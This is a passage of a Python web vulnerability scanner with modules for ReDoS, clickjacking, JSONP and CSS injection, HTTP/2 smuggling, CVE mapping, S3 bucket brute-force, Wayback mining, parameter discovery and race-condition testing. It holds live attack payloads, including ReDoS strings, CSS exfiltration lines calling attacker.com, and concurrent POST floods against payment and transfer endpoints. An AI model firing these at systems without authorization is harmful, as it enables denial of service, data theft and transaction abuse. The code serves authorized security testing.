                    "evidence": f"Non-exist user msg: {body1[:100]} | Wrong pass msg: {body2[:100]}",
                })
            elif r_nonexist.elapsed.total_seconds() - r_mayexist.elapsed.total_seconds() > 1.0:
                add("acct_takeover", {
                    "severity": "Medium",
                    "confirmed": True,
                    "title": "Username Enumeration via Response Timing",
                    "description": f"Login takes {r_mayexist.elapsed.total_seconds():.2f}s for existing users vs {r_nonexist.elapsed.total_seconds():.2f}s for non-existing. Timing difference allows username enumeration.",
                    "recommendation": "Use constant-time comparison for password verification. Add artificial delay to equalize response time.",
                    "url": login_ep,
                    "evidence": f"Timing delta: {abs(r_nonexist.elapsed.total_seconds()-r_mayexist.elapsed.total_seconds()):.2f}s",
                })
        except Exception: pass

    good("Account takeover scan complete")
    _module_done("acct_takeover")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 62 — ReDoS (Regular Expression Denial of Service)
# ═══════════════════════════════════════════════════════════════════════
def redos_scan(url):
    if _module_skip("redos"): return
    section("MODULE 62 — REGEX DOS (ReDoS)","⏱️")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"email": ["test@example.com"], "search": ["test"],
                  "phone": ["1234567890"], "username": ["testuser"]}

    # ReDoS payloads targeting common vulnerable regexes
    REDOS_PAYLOADS = {
        "email": [
            "a" * 30 + "@" + "a" * 30 + "." + "a" * 30,
            "aaa@aaa." + "a" * 50,
            "a@" + "." * 50 + "com",
        ],
        "phone": [
            "1" * 50 + "!",
            "+1" + "1" * 48,
        ],
        "username": [
            "a" * 50 + "!",
            "aA" * 25 + "!",
        ],
        "search": [
            "a" * 100,
            "<" + "a" * 50 + ">",
        ],
        "generic": [
            "a" * 50 + "!",
            ("a?" * 25) + ("a" * 25),
        ],
    }

    # Measure baseline
    try:
        t0 = time.time()
        rget(url, timeout=TIMEOUT)
        baseline = time.time() - t0
    except Exception:
        baseline = 1.0

    for param in list(params.keys())[:4]:
        # Choose payloads based on param name
        param_lower = param.lower()
        if "email" in param_lower:
            payloads = REDOS_PAYLOADS["email"]
        elif "phone" in param_lower:
            payloads = REDOS_PAYLOADS["phone"]
        elif "user" in param_lower or "name" in param_lower:
            payloads = REDOS_PAYLOADS["username"]
        elif "search" in param_lower or "query" in param_lower or "q" == param_lower:
            payloads = REDOS_PAYLOADS["search"]
        else:
            payloads = REDOS_PAYLOADS["generic"]

        for payload in payloads:
            try:
                tp = dict(params); tp[param] = [payload]
                test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
                t0 = time.time()
                r = rget(test_url, timeout=max(TIMEOUT, baseline + 10))
                elapsed = time.time() - t0
                delay = elapsed - baseline
                if delay > 3.0:
                    vuln(f"ReDoS CONFIRMED param='{param}' delay={elapsed:.1f}s (baseline={baseline:.1f}s)", "High")
                    add("redos", {
                        "severity": "High",
                        "confirmed": True,
                        "title": f"ReDoS (Regex Denial of Service) CONFIRMED — Parameter '{param}'",
                        "description": f"CONFIRMED: Parameter '{param}' caused {delay:.1f}s delay above baseline with crafted input. Indicates vulnerable regex processing that can be exploited for DoS.",
                        "recommendation": "Audit all regex patterns. Avoid catastrophic backtracking patterns like (a+)+ or (a|aa)+. Use regex timeout/atomic groups.",
                        "url": test_url,
                        "evidence": f"Payload length {len(payload)} chars → {elapsed:.2f}s response (baseline {baseline:.2f}s, delta +{delay:.2f}s)",
                    })
                    break
            except requests.exceptions.Timeout:
                vuln(f"ReDoS CONFIRMED (timeout) param='{param}'", "High")
                tp2 = dict(params); tp2[param] = [payload]
                add("redos", {
                    "severity": "High",
                    "confirmed": True,
                    "title": f"ReDoS CONFIRMED (Server Timeout) — Parameter '{param}'",
                    "description": f"CONFIRMED: Parameter '{param}' caused server timeout with ReDoS payload. Server-side regex is vulnerable to catastrophic backtracking.",
                    "recommendation": "Replace vulnerable regex with safe alternatives. Add timeout for regex evaluation.",
                    "url": parsed._replace(query=urlencode(tp2, doseq=True)).geturl(),
                    "evidence": f"Server timed out processing ReDoS payload for param '{param}'",
                })
                break
            except Exception: pass

    good("ReDoS scan complete")
    _module_done("redos")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 63 — CLICKJACKING
# ═══════════════════════════════════════════════════════════════════════
def clickjacking_scan(url):
    if _module_skip("clickjacking"): return
    section("MODULE 63 — CLICKJACKING","🖱️")

    try:
        r = rget(url, timeout=TIMEOUT)
        hdrs = {k.lower(): v for k,v in r.headers.items()}

        xfo = hdrs.get("x-frame-options","")
        csp = hdrs.get("content-security-policy","")

        frame_protected = False

        if xfo:
            if xfo.upper() in ("DENY","SAMEORIGIN"):
                frame_protected = True
                good(f"X-Frame-Options: {xfo} — Clickjacking protected")
            elif "ALLOW-FROM" in xfo.upper():
                # Allow-from is deprecated and not supported in modern browsers
                frame_protected = False
                add("clickjacking", {
                    "severity": "Medium",
                    "confirmed": True,
                    "title": "X-Frame-Options Uses Deprecated ALLOW-FROM",
                    "description": "X-Frame-Options: ALLOW-FROM is deprecated and not supported by Chrome, Firefox, or Edge. The site may still be frameable in modern browsers.",
                    "recommendation": "Replace X-Frame-Options with the modern CSP frame-ancestors directive.\nNginx: add_header Content-Security-Policy \"frame-ancestors 'none';\" always;\nApache: Header always set Content-Security-Policy \"frame-ancestors 'none'\"\n(Remove any existing X-Frame-Options header to avoid conflicts.)",
                    "url": url,
                    "evidence": f"X-Frame-Options: {xfo}",
                })

        if csp and "frame-ancestors" in csp.lower():
            frame_protected = True
            good(f"CSP frame-ancestors present — Clickjacking protected")

        if not frame_protected:
            # Check if the page can actually be framed (some servers redirect/break in frames)
            vuln(f"Clickjacking — no framing protection on {url}", "Medium")
            add("clickjacking", {
                "severity": "Medium",
                "confirmed": True,
                "title": "Clickjacking Protection Missing",
                "description": "Page lacks X-Frame-Options or Content-Security-Policy frame-ancestors header. Attackers can embed this page in an iframe and trick users into performing unintended actions (clicks, form submissions, purchases).",
                "recommendation": "Protect against Clickjacking — choose one approach:\nOption A (modern): Nginx: add_header Content-Security-Policy \"frame-ancestors 'none';\" always;\nOption B (legacy): Nginx: add_header X-Frame-Options \"DENY\" always;\nApache (modern): Header always set Content-Security-Policy \"frame-ancestors 'none'\"\nApache (legacy): Header always set X-Frame-Options \"DENY\"\nPrefer frame-ancestors; it supersedes X-Frame-Options in all modern browsers.",
                "url": url,
                "evidence": f"X-Frame-Options: {xfo or 'MISSING'} | CSP frame-ancestors: {'MISSING' if 'frame-ancestors' not in csp.lower() else 'present but check value'}",
            })
        else:
            good("Clickjacking protection confirmed")
    except Exception as e:
        info(f"Clickjacking check error: {e}")

    _module_done("clickjacking")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 64 — JSONP INJECTION
# ═══════════════════════════════════════════════════════════════════════
def jsonp_scan(url):
    if _module_skip("jsonp_inject"): return
    section("MODULE 64 — JSONP INJECTION","🔗")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Common JSONP endpoints
    JSONP_ENDPOINTS = [
        "/api/user", "/api/profile", "/api/data", "/api/account",
        "/jsonp", "/callback", "/api/callback",
        "/api/v1/user", "/api/v2/user",
        "/user.json", "/profile.json", "/data.json",
    ]
    CALLBACK_PARAMS = ["callback", "cb", "jsonp", "jsonpcallback",
                       "jcb", "fn", "func", "function"]
    MALICIOUS_CALLBACK = "alert"

    # Check crawled URLs with query params for JSONP patterns
    to_check = JSONP_ENDPOINTS[:]
    for crawled_url in list(CRAWLED_URLS)[:20]:
        cp = urlparse(crawled_url)
        qp = parse_qs(cp.query)
        if any(cb in qp for cb in CALLBACK_PARAMS):
            to_check.append(cp.path)

    for ep in to_check[:15]:
        ep_url = base + ep
        for cb_param in CALLBACK_PARAMS:
            try:
                test_url = f"{ep_url}?{cb_param}={MALICIOUS_CALLBACK}"
                r = rget(test_url, timeout=TIMEOUT,
                         headers={"Origin": "https://attacker.example.com",
                                  "Referer": "https://attacker.example.com/"})
                ct = r.headers.get("Content-Type","")
                body = r.text

                # JSONP confirmed if: callback name appears in response wrapping JSON
                if MALICIOUS_CALLBACK + "(" in body or MALICIOUS_CALLBACK + " (" in body:
                    vuln(f"JSONP injection CONFIRMED: {ep}?{cb_param}=alert", "High")
                    add("jsonp_inject", {
                        "severity": "High",
                        "confirmed": True,
                        "title": f"JSONP Injection CONFIRMED — {ep}?{cb_param}=",
                        "description": f"CONFIRMED: Endpoint {ep_url} reflects the callback parameter value unvalidated. Attacker can set callback to malicious function name. If authenticated users visit attacker page loading this JSONP, their data is stolen.",
                        "recommendation": "Whitelist allowed callback function names. Prefer CORS over JSONP. Add Content-Type: application/json.",
                        "url": test_url,
                        "evidence": f"Response starts with: {body[:100]}",
                    })
                    break
                elif cb_param in parse_qs(urlparse(r.url).query) and "application/javascript" in ct:
                    add("jsonp_inject", {
                        "severity": "Medium",
                        "confirmed": False,
                        "title": f"Potential JSONP Endpoint — {ep}?{cb_param}=",
                        "description": f"Endpoint returns JavaScript content-type with callback parameter. Manual verification required to confirm JSONP injection.",
                        "recommendation": "Whitelist callback names. Prefer CORS. Set Content-Type: application/json.",
                        "url": test_url,
                        "evidence": f"Content-Type: {ct}",
                    })
            except Exception: pass

    good("JSONP scan complete")
    _module_done("jsonp_inject")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 65 — CSS INJECTION
# ═══════════════════════════════════════════════════════════════════════
def css_injection_scan(url):
    if _module_skip("css_inject"): return
    section("MODULE 65 — CSS INJECTION","🎨")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"theme": ["default"], "color": ["blue"],
                  "style": ["light"], "css": [""], "skin": ["default"]}

    CSS_PAYLOADS = [
        "};body{background:red}/*",
        "} body { background-color: red; } /*",
        "@import url('https://attacker.com/steal.css');",
        "* { background: url('http://attacker.com/?d=' attr(data-secret)) }",
        "input[value^='a'] ~ * { background: url('http://attacker.com/a') }",
    ]

    for param in list(params.keys())[:4]:
        for payload in CSS_PAYLOADS[:3]:
            try:
                tp = dict(params); tp[param] = [payload]
                test_url = parsed._replace(query=urlencode(tp, doseq=True)).geturl()
                r = rget(test_url, timeout=TIMEOUT)
                body = r.text
                ct = r.headers.get("Content-Type","")

                # Check if payload appears in CSS context (style block or external CSS)
                if ("text/css" in ct or "<style" in body.lower()) and payload in body:
                    vuln(f"CSS injection CONFIRMED param='{param}'", "Medium")
                    add("css_inject", {
                        "severity": "Medium",
                        "confirmed": True,
                        "title": f"CSS Injection CONFIRMED — Parameter '{param}'",
                        "description": f"CONFIRMED: CSS payload reflected inside <style> block or CSS response. Attackers can inject CSS to exfiltrate CSRF tokens, perform data theft via attribute selectors, or deface the page.",
                        "recommendation": "Sanitize CSS input. Use CSP with strict-dynamic. Never interpolate user input into CSS.",
                        "url": test_url,
                        "evidence": f"Payload '{payload[:50]}' reflected in CSS context",
                    })
                    break
                elif payload in body:
                    add("css_inject", {
                        "severity": "Low",
                        "confirmed": False,
                        "title": f"Potential CSS Injection — Parameter '{param}'",
                        "description": f"CSS payload reflected in HTML response. Manual check required to confirm CSS context.",
                        "recommendation": "Sanitize all user input used in stylesheets or style attributes.",
                        "url": test_url,
                        "evidence": f"Payload '{payload[:50]}' found in response",
                    })
            except Exception: pass

    good("CSS injection scan complete")
    _module_done("css_inject")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 66 — HTTP/2 VULNERABILITIES
# ═══════════════════════════════════════════════════════════════════════
def http2_scan(url):
    if _module_skip("http2_vulns"): return
    section("MODULE 66 — HTTP/2 VULNERABILITIES","🌐")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    try:
        # Check if HTTP/2 is supported
        r = rget(url, timeout=TIMEOUT)
        # requests uses HTTP/1.1 by default; check response version
        # We can detect HTTP/2 support via ALPN/Alt-Svc header
        alt_svc = r.headers.get("Alt-Svc","")
        upgrade = r.headers.get("Upgrade","")
        h2_supported = "h2" in alt_svc or "h2" in upgrade.lower()

        if h2_supported:
            info(f"HTTP/2 advertised via Alt-Svc: {alt_svc}")
            # Note: actual HTTP/2 testing requires httpx or h2 library
            add("http2_vulns", {
                "severity": "Info",
                "confirmed": True,
                "title": "HTTP/2 Protocol Supported",
                "description": f"Server advertises HTTP/2 support via Alt-Svc or Upgrade header. HTTP/2 implementations should be audited for rapid reset (CVE-2023-44487), header injection, and stream ID exhaustion.",
                "recommendation": "Ensure HTTP/2 is current version. Rate-limit streams. Apply server patches for CVE-2023-44487 (Rapid Reset).",
                "url": url,
                "evidence": f"Alt-Svc: {alt_svc}",
            })

        # Check for HTTP/2 Rapid Reset vulnerability indication (CVE-2023-44487)
        # This can't be fully tested without HTTP/2 library but we flag based on version
        server_hdr = r.headers.get("Server","").lower()
        if any(s in server_hdr for s in ["nginx/1.18","nginx/1.19","nginx/1.20","nginx/1.21","nginx/1.22",
                                          "nginx/1.23","nginx/1.24","apache/2.4.5","apache/2.4.56",
                                          "apache/2.4.57","apache/2.4.58"]):
            add("http2_vulns", {
                "severity": "High",
                "confirmed": False,
                "title": f"Potential HTTP/2 Rapid Reset Vulnerability (CVE-2023-44487)",
                "description": f"Server version ({r.headers.get('Server','')}) may be affected by HTTP/2 Rapid Reset DDoS (CVE-2023-44487). This allows attackers to send RST_STREAM immediately after HEADERS to overwhelm server.",
                "recommendation": "Update web server. Apply vendor patches. Implement stream rate limiting. Use DDoS mitigation service.",
                "url": url,
                "evidence": f"Server: {r.headers.get('Server','')}",
            })

        # Check for HTTP request smuggling potential
        # Test: Content-Length vs Transfer-Encoding conflict
        try:
            smuggle_r = _sess.get(url, timeout=TIMEOUT,
                                   headers={"Transfer-Encoding": "chunked",
                                            "Content-Length": "5"})
            if smuggle_r.status_code == 200:
                add("http2_vulns", {
                    "severity": "Medium",
                    "confirmed": False,
                    "title": "Potential HTTP Desync / Smuggling Vector",
                    "description": "Server accepted conflicting Transfer-Encoding and Content-Length headers. This may enable HTTP request smuggling between frontend/backend proxy pairs.",
                    "recommendation": "Normalize ambiguous requests at reverse proxy. Use same HTTP version throughout stack. Apply vendor security patches.",
                    "url": url,
                    "evidence": "GET with both TE:chunked and CL:5 → 200 OK",
                })
        except Exception: pass

    except Exception as e:
        info(f"HTTP/2 scan error: {e}")

    good("HTTP/2 scan complete")
    _module_done("http2_vulns")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 67 — CVE MAPPING (Technology → Known CVEs)
# ═══════════════════════════════════════════════════════════════════════
def cve_mapping_scan(url):
    if _module_skip("cve_scan"): return
    section("MODULE 67 — CVE MAPPING","📋")

    # Pull technology detection results from FINDINGS
    detected_techs = []
    for item in FINDINGS.get("tech", []):
        tech_str = str(item)
        for tech_name in CVE_DB.keys():
            if tech_name.lower() in tech_str.lower():
                detected_techs.append(tech_name)

    # Also check headers directly
    try:
        r = rget(url, timeout=TIMEOUT)
        hdrs_str = str(dict(r.headers)).lower()
        body_low  = r.text[:5000].lower()
        for tech_name in CVE_DB.keys():
            if tech_name.lower() in hdrs_str or tech_name.lower() in body_low:
                if tech_name not in detected_techs:
                    detected_techs.append(tech_name)
    except Exception: pass

    if not detected_techs:
        info("No technologies matched CVE database")
        _module_done("cve_scan"); return

    info(f"CVE mapping: checking {len(detected_techs)} detected technologies")
    mapped_count = 0

    for tech in detected_techs:
        cves = CVE_DB.get(tech, [])
        if cves:
            mapped_count += len(cves)
            # Group by severity
            critical_cves = [c for c in cves if c["cvss"] >= 9.0]
            high_cves     = [c for c in cves if 7.0 <= c["cvss"] < 9.0]

            if critical_cves:
                sev = "Critical"
            elif high_cves:
                sev = "High"
            else:
                sev = "Medium"

            cve_list = ", ".join(c["id"] for c in cves)
            top_cve = max(cves, key=lambda c: c["cvss"])

            vuln(f"CVE match: {tech} → {len(cves)} CVEs (highest: {top_cve['id']} CVSS {top_cve['cvss']})", sev)
            add("cve_scan", {
                "severity": sev,
                "confirmed": False,
                "title": f"CVE Match: {tech} — {len(cves)} Known Vulnerabilities",
                "description": (f"Technology '{tech}' has {len(cves)} known CVEs in database. "
                               f"Highest severity: {top_cve['id']} (CVSS {top_cve['cvss']}): {top_cve['desc']}. "
                               f"ALL CVEs: {cve_list}. "
                               f"Note: Actual exploitability depends on exact version. Verify version before confirming."),
                "recommendation": f"Identify exact {tech} version. Apply all security patches. Subscribe to {tech} security advisories. Consider upgrading to latest stable.",
                "url": url,
                "evidence": f"Technology '{tech}' detected | CVEs: {cve_list}",
            })

    if mapped_count:
        good(f"CVE mapping: {mapped_count} CVEs mapped across {len(detected_techs)} technologies")
    else:
        good("CVE mapping: no known CVEs for detected technologies")

    _module_done("cve_scan")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 68 — S3 BUCKET BRUTE-FORCE
# ═══════════════════════════════════════════════════════════════════════
def s3_brute_scan(url):
    if _module_skip("s3_brute"): return
    section("MODULE 68 — S3 BUCKET BRUTE-FORCE","🪣")

    parsed = urlparse(url)
    domain = parsed.hostname or ""
    parts  = domain.split(".")
    company = re.sub(r"[^a-z0-9-]", "", (parts[-2] if len(parts) >= 2 else parts[0]).lower())

    # Extended bucket name list for brute-force
    BUCKET_NAMES = [
        company, f"{company}-backup", f"{company}-bkp", f"{company}-data",
        f"{company}-files", f"{company}-assets", f"{company}-media",
        f"{company}-uploads", f"{company}-static", f"{company}-images",
        f"{company}-img", f"{company}-logs", f"{company}-log",
        f"{company}-dev", f"{company}-development", f"{company}-staging",
        f"{company}-prod", f"{company}-production", f"{company}-release",
        f"{company}-public", f"{company}-private", f"{company}-storage",
        f"{company}-bucket", f"{company}-store", f"{company}-archive",
        f"{company}-config", f"{company}-conf", f"{company}-secrets",
        f"backup-{company}", f"static-{company}", f"assets-{company}",
        f"files-{company}", f"uploads-{company}", f"media-{company}",
        f"dev-{company}", f"staging-{company}", f"prod-{company}",
        f"{company}backup", f"{company}files", f"{company}data",
        f"{company}2", f"{company}3", f"{company}test",
    ]

    found = 0
    for name in BUCKET_NAMES[:20]:
        for s3_url_tpl in [
            f"https://{name}.s3.amazonaws.com/",
            f"https://s3.amazonaws.com/{name}/",
        ]:
            try:
                r = rget(s3_url_tpl, timeout=4, allow_redirects=True)
                if r.status_code == 200:
                    found += 1
                    # Try to list objects
                    files_found = re.findall(r"<Key>([^<]+)</Key>", r.text)
                    vuln(f"Open S3 bucket: {name} ({len(files_found)} objects visible)", "Critical")
                    add("s3_brute", {
                        "severity": "Critical",
                        "confirmed": True,
                        "title": f"Open S3 Bucket Found: {name}",
                        "description": f"S3 bucket '{name}' is publicly readable. {len(files_found)} object(s) visible. Any data stored can be downloaded without authentication.",
                        "recommendation": "Set bucket ACL to private immediately. Add S3 Block Public Access. Audit all objects for sensitive data. Enable CloudTrail.",
                        "url": s3_url_tpl,
                        "evidence": f"HTTP 200 from {s3_url_tpl} | Objects: {', '.join(files_found[:5]) if files_found else 'bucket listing visible'}",
                    })
                elif r.status_code == 403:
                    info(f"S3 bucket exists (private): {name}")
                    add("s3_brute", {
                        "severity": "Info",
                        "confirmed": True,
                        "title": f"S3 Bucket Identified (Private): {name}",
                        "description": f"S3 bucket '{name}' exists but access is denied. Verify ACL is intentionally private and no other misconfigurations exist.",
                        "recommendation": "Enable S3 Block Public Access. Use least-privilege IAM policies. Enable access logging.",
                        "url": s3_url_tpl,
                        "evidence": f"HTTP 403 from {s3_url_tpl}",
                    })
                break  # found on this pattern, skip next pattern for same name
            except Exception: pass

    if found == 0:
        good("No open S3 buckets found in brute-force")
    _module_done("s3_brute")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 69 — WAYBACK MACHINE / ARCHIVE URLS
# ═══════════════════════════════════════════════════════════════════════
def wayback_scan(url):
    if _module_skip("wayback_urls"): return
    section("MODULE 69 — WAYBACK / ARCHIVE URLS","🕰️")

    parsed = urlparse(url)
    domain = parsed.hostname or ""

    try:
        # Query Wayback CDX API for historical URLs
        wb_api = (f"https://web.archive.org/cdx/search/cdx?"
                  f"url={domain}/*&output=json&fl=original&collapse=urlkey"
                  f"&filter=statuscode:200&limit=100")
        r = rget(wb_api, timeout=12, allow_redirects=True)
        if r.status_code == 200:
            try:
                data = r.json()
                # data[0] is header row ["original"], rest are data rows
                if len(data) > 1:
                    historical_urls = [row[0] for row in data[1:] if row]
                    info(f"Wayback: {len(historical_urls)} historical URLs found")

                    # Look for sensitive historical endpoints
                    INTERESTING = [
                        "/admin", "/backup", "/config", "/database", "/db",
                        "/.git", "/.env", "/phpinfo", "/debug", "/test",
                        "/api/", "/swagger", "/actuator", "/console",
                        "/.aws", "/.ssh", "/password", "/secret", "/credential",
                        "/staging", "/dev/", "/internal/", "/private/",
                        ".sql", ".bak", ".zip", ".tar", ".log", ".conf",
                        "?debug=", "?admin=", "?password=", "?token=",
                    ]

                    sensitive_hist = [u for u in historical_urls
                                      if any(x in u.lower() for x in INTERESTING)]

                    if sensitive_hist:
                        warn(f"Wayback: {len(sensitive_hist)} sensitive historical URLs")
                        add("wayback_urls", {
                            "severity": "Medium",
                            "confirmed": True,
                            "title": f"Sensitive Historical URLs in Wayback Machine ({len(sensitive_hist)} URLs)",
                            "description": f"Wayback Machine has {len(historical_urls)} archived URLs for {domain}. {len(sensitive_hist)} appear sensitive. Historical endpoints may still be accessible or reveal application structure.",
                            "recommendation": "Test each sensitive historical URL for current accessibility. Remove sensitive files from production. Add to robots.txt (note: doesn't remove existing archives).",
                            "url": url,
                            "evidence": "Sensitive URLs: " + " | ".join(sensitive_hist[:5]),
                        })

                        # Try to access top 5 sensitive historical URLs
                        for hist_url in sensitive_hist[:5]:
                            try:
                                r2 = rget(hist_url, timeout=5, allow_redirects=True)
                                if r2.status_code == 200 and len(r2.text) > 100:
                                    vuln(f"Historical endpoint still live: {hist_url}", "High")
                                    add("wayback_urls", {
                                        "severity": "High",
                                        "confirmed": True,
                                        "title": f"Historical Sensitive Endpoint Still Accessible: {hist_url[:80]}",
                                        "description": f"CONFIRMED: Historical URL from Wayback Machine is still live and returns 200. This endpoint may contain sensitive information or deprecated functionality.",
                                        "recommendation": "Remove or restrict access to this endpoint. Conduct full security audit of this path.",
                                        "url": hist_url,
                                        "evidence": f"HTTP 200, {len(r2.text)} bytes — URL from Wayback archive is still live",
                                    })
                            except Exception: pass
                    else:
                        info(f"Wayback: {len(historical_urls)} URLs found, none appear sensitive")
                        add("wayback_urls", {
                            "severity": "Info",
                            "confirmed": True,
                            "title": f"Wayback Machine: {len(historical_urls)} Historical URLs Archived",
                            "description": f"Wayback Machine has archived {len(historical_urls)} URLs for {domain}. No obviously sensitive paths detected.",
                            "recommendation": "Periodically review archived URLs. Remove sensitive content from production.",
                            "url": url,
                            "evidence": f"{len(historical_urls)} historical URLs found",
                        })
                else:
                    info(f"Wayback: no historical data for {domain}")
            except (ValueError, KeyError): pass
        else:
            info(f"Wayback CDX API returned HTTP {r.status_code}")
    except Exception as e:
        info(f"Wayback scan error: {e}")

    good("Wayback scan complete")
    _module_done("wayback_urls")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 70 — PARAMETER DISCOVERY (Arjun-style)
# ═══════════════════════════════════════════════════════════════════════
def param_discovery_scan(url):
    if _module_skip("param_discover"): return
    section("MODULE 70 — PARAMETER DISCOVERY","🔎")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    path   = parsed.path or "/"

    # Common hidden parameters to test
    HIDDEN_PARAMS = [
        "id", "user_id", "uid", "account", "admin", "debug", "test",
        "redirect", "url", "next", "return", "callback", "file", "path",
        "include", "require", "page", "module", "action", "cmd", "command",
        "exec", "execute", "query", "search", "q", "s", "token", "key",
        "api_key", "apikey", "secret", "password", "pass", "pwd",
        "email", "username", "user", "name", "type", "format", "output",
        "lang", "language", "locale", "currency", "country",
        "category", "cat", "section", "sub", "parent",
        "sort", "order", "orderby", "dir", "asc", "desc",
        "limit", "offset", "count", "size", "num",
        "start", "end", "from", "to", "date",
        "tab", "view", "mode", "layout", "theme", "color",
        "source", "ref", "referrer", "origin",
        "verbose", "log", "trace", "data", "value",
        "config", "conf", "setting", "options",
        "auth", "access", "role", "permission",
        "proxy", "host", "server", "port", "ip",
        "xml", "json", "yaml", "content", "body",
    ]

    # Baseline response for comparison
    try:
        r_baseline = rget(url, timeout=TIMEOUT)
        baseline_len = len(r_baseline.text)
        baseline_status = r_baseline.status_code
    except Exception:
        good("Parameter discovery skipped — baseline failed")
        _module_done("param_discover"); return

    info(f"Parameter discovery: testing {len(HIDDEN_PARAMS)} parameters on {path}")
    discovered = []

    def _test_param(param):
        try:
            test_url = f"{base}{path}?{param}=test"
            r = rget(test_url, timeout=TIMEOUT, allow_redirects=True)
            # Different status = interesting
            if r.status_code != baseline_status:
                discovered.append((param, r.status_code, f"Status changed: {baseline_status} → {r.status_code}"))
                return
            # Significantly different response size = interesting
            diff = abs(len(r.text) - baseline_len)
            if diff > 500:  # > 500 bytes difference
                discovered.append((param, r.status_code, f"Response size changed: {baseline_len} → {len(r.text)} bytes (Δ {diff})"))
                return
            # Error indicators = interesting
            body_low = r.text.lower()
            if any(x in body_low for x in ["undefined","null","notice:","warning:","error:"]):
                # Also check if NOT in baseline
                if not any(x in r_baseline.text.lower() for x in ["undefined","null","notice:","warning:","error:"]):
                    discovered.append((param, r.status_code, "Error indicator appeared in response"))
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(_test_param, p) for p in HIDDEN_PARAMS]
        for f in as_completed(futs): _pass(f)

    if discovered:
        warn(f"Parameter discovery: {len(discovered)} hidden parameters found")
        for param, status, reason in discovered[:10]:
            add("param_discover", {
                "severity": "Medium",
                "confirmed": False,
                "title": f"Hidden Parameter Discovered: '{param}'",
                "description": f"Parameter '{param}' produced a different server response than the baseline. This suggests the parameter is processed by the application. Manual testing required to determine exploitability.",
                "recommendation": "Review all discovered parameters for injection vulnerabilities (SQLi, XSS, SSRF, path traversal). Remove unnecessary debug/admin parameters from production.",
                "url": f"{base}{path}?{param}=test",
                "evidence": f"Param '{param}' → {reason}",
            })
    else:
        good("No hidden parameters discovered")

    _module_done("param_discover")


# ═══════════════════════════════════════════════════════════════════════
#  MODULE 71 — RACE CONDITION TESTING
# ═══════════════════════════════════════════════════════════════════════
def race_condition_scan(url):
    if _module_skip("race_condition"): return
    section("MODULE 71 — RACE CONDITION TESTING","🏁")

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # Find race-condition-prone endpoints
    RACE_ENDPOINTS = [
        # Payment/Transaction
        ("/api/checkout",      "POST", {"amount": "10", "item_id": "1"}),
        ("/api/purchase",      "POST", {"product_id": "1", "quantity": "1"}),
        ("/api/payment",       "POST", {"amount": "10"}),
        ("/api/transfer",      "POST", {"amount": "100", "to": "user2"}),
        # Coupon/Discount
        ("/api/coupon/apply",  "POST", {"code": "SAVE10"}),
        ("/api/discount",      "POST", {"code": "DISCOUNT10"}),
        ("/api/voucher",       "POST", {"code": "VOUCHER10"}),
        # Like/Vote (should be single-use)
        ("/api/like",          "POST", {"post_id": "1"}),
        ("/api/vote",          "POST", {"option_id": "1"}),
        ("/api/react",         "POST", {"item_id": "1", "type": "like"}),
        # Referral/Bonus
        ("/api/referral",      "POST", {"code": "REF123"}),
        ("/api/bonus",         "POST", {"type": "daily"}),
    ]

    for ep, method, data in RACE_ENDPOINTS:
        ep_url = base + ep
        try:
            # First probe the endpoint
            probe = rget(ep_url, allow_redirects=False, timeout=4)
            if probe.status_code not in (200, 201, 400, 401, 403, 405, 422):
                continue

            # Race condition test: send 10 simultaneous requests
            results = []
            lock = threading.Lock()

            def _race_req():
                try:
                    r = rpost(ep_url, json=data, timeout=5)
                    with lock:
                        results.append((r.status_code, r.text[:200]))
                except Exception: pass

            # Synchronize start for maximum concurrency
            ready = threading.Barrier(10, timeout=5)
            threads = []
            for _ in range(10):
                def _t():
                    try: ready.wait()
                    except Exception: pass
                    _race_req()
                t = threading.Thread(target=_t)
                t.daemon = True
                threads.append(t)

            for t in threads: t.start()
            for t in threads: t.join(timeout=8)

            if len(results) >= 2:
                success_count = sum(1 for status, body in results
                                    if status in (200, 201) and
                                    any(x in body.lower() for x in
                                        ["success","applied","ok","true","accepted","created"]))

                if success_count >= 2:
                    vuln(f"Race condition CONFIRMED at {ep} — {success_count}/10 concurrent requests succeeded", "High")
                    add("race_condition", {
                        "severity": "High",
                        "confirmed": True,
                        "title": f"Race Condition CONFIRMED — {ep}",
                        "description": f"CONFIRMED: {success_count} out of 10 simultaneous requests to {ep_url} succeeded concurrently. This indicates insufficient atomicity in the operation — attackers can abuse this to apply coupons multiple times, transfer more than available balance, or trigger duplicate actions.",
                        "recommendation": "Use database transactions with proper isolation level (SERIALIZABLE). Implement optimistic locking. Use atomic compare-and-swap operations. Redis distributed locks for critical sections.",
                        "url": ep_url,
                        "evidence": f"{success_count}/10 concurrent requests returned success status",
                    })

        except Exception: pass

    good("Race condition scan complete")
    _module_done("race_condition")


# ═══════════════════════════════════════════════════════════════════════
#  WAF BYPASS SCAN
# ═══════════════════════════════════════════════════════════════════════
def waf_bypass_scan(url):
    """Test WAF bypass techniques — if WAF detected, try to find bypasses."""
    if _module_skip("waf_bypass"): return
    # Only run if WAF was detected
    waf_detected = any(item.get("title","").startswith("WAF") for item in FINDINGS.get("waf",[])) if FINDINGS.get("waf") else False

    if not waf_detected:
        info("No WAF detected — skipping WAF bypass scan")
        _module_done("waf_bypass"); return

    section("WAF BYPASS TESTING","🛡️")

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"id": ["1"], "search": ["test"]}

    info(f"Testing {len(WAF_BYPASS_SQLI)} WAF bypass SQLi payloads and {len(WAF_BYPASS_XSS)} bypass XSS payloads")

    DB_ERRORS = ["sql syntax","mysql","postgres","oracle","sqlite","database error",
